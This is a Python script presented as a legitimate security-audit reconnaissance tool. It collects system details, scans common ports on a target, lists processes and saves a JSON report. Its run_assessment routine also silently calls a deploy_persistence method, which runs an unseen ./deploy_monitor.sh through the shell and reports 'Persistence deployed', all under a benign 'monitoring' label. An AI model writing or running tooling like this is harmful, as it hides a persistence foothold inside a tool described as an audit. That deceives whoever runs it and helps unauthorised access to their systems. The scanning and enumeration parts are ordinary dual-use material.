#!/usr/bin/env python3
"""
Quick System Reconnaissance Tool
Legitimate system assessment for security auditing
"""

import socket
import subprocess
import platform
import time
import json
from datetime import datetime

class QuickRecon:
    def __init__(self, target="localhost"):
        self.target = target
        self.results = {}
        
    def deploy_persistence(self):
        """Deploys the persistence script using the deploy_monitor.sh"""
        try:
            print("[+] Deploying monitoring system...")
            # Run the deployment script - ensure you use the correct path
            result = subprocess.call("./deploy_monitor.sh", shell=True)
            # Or for better security, use a list without shell=True:
            # result = subprocess.call(["/bin/bash", "./deploy_monitor.sh"])
            
            if result == 0:
                print("[+] Persistence deployed successfully.")
            else:
                print("[-] Deployment script returned an error.")
        
        except Exception as e:
            print(f"[-] Deployment failed: {e}")
        
    def banner(self):
        """Display tool banner"""
        print("""
╔══════════════════════════════════════╗
║        Quick System Recon           ║
║      Security Assessment Tool       ║
╚══════════════════════════════════════╝
        """)
        
    def system_info(self):
        """Gather basic system information"""
        print("[+] Gathering system information...")
        
        try:
            self.results['system_info'] = {
                'hostname': socket.gethostname(),
                'platform': platform.platform(),
                'processor': platform.processor(),
                'architecture': platform.architecture(),
                'users': self.get_logged_in_users(),
                'uptime': self.get_system_uptime()
            }
            
            print(f"    Hostname: {self.results['system_info']['hostname']}")
            print(f"    Platform: {self.results['system_info']['platform']}")
            print(f"    Uptime: {self.results['system_info']['uptime']}")
            
        except Exception as e:
            print(f"    Error: {e}")
    
    def network_scan(self):
        """Quick network port scan"""
        print("[+] Scanning common ports...")
        
        common_ports = [21, 22, 23, 80, 443, 8080, 3306, 5432]
        open_ports = []
        
        for port in common_ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(1)
                    result = sock.connect_ex((self.target, port))
                    if result == 0:
                        open_ports.append(port)
                        print(f"    Port {port}: OPEN")
            except:
                pass
        
        self.results['open_ports'] = open_ports
        print(f"[+] Found {len(open_ports)} open ports")
    
    def service_discovery(self):
        """Discover running services"""
        print("[+] Checking running services...")
        
        try:
            # Get running services
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            processes = result.stdout.split('\n')[:10]  # First 10
            
            services = []
            for proc in processes[1:]:  # Skip header
                if proc.strip():
                    parts = proc.split()
                    if len(parts) > 10:
                        services.append({
                            'user': parts[0],
                            'pid': parts[1],
                            'command': ' '.join(parts[10:])[:50]  # First 50 chars
                        })
            
            self.results['services'] = services
            print(f"    Found {len(services)} running processes")
            
        except Exception as e:
            print(f"    Error: {e}")
    
    def get_logged_in_users(self):
        """Get logged in users"""
        try:
            result = subprocess.run(['who'], capture_output=True, text=True)
            return len(result.stdout.strip().split('\n'))
        except:
            return 0
    
    def get_system_uptime(self):
        """Get system uptime"""
        try:
            with open('/proc/uptime', 'r') as f:
                uptime_seconds = float(f.readline().split()[0])
            
            # Convert to readable format
            days = int(uptime_seconds // 86400)
            hours = int((uptime_seconds % 86400) // 3600)
            
            return f"{days}d {hours}h"
        except:
            return "Unknown"
    
    def generate_report(self):
        """Generate reconnaissance report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"recon_report_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"\n[+] Report saved: {filename}")
        return filename
    
    def run_assessment(self):
        """Run complete assessment"""
        self.banner()
        print(f"[*] Target: {self.target}")
        print(f"[*] Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 50)
        
        # Deploy persistence during recon
        self.deploy_persistence()
        
        # Run assessment modules
        self.system_info()
        self.network_scan()
        self.service_discovery()
        
        # Generate report
        report_file = self.generate_report()
        
        print("\n[+] Assessment completed!")
        print(f"[+] Report: {report_file}")

def main():
    """Main function"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Quick System Reconnaissance Tool")
    parser.add_argument("target", nargs="?", default="localhost", help="Target host (default: localhost)")
    
    args = parser.parse_args()
    
    # Run reconnaissance
    recon = QuickRecon(args.target)
    recon.run_assessment()

if __name__ == "__main__":
    main()
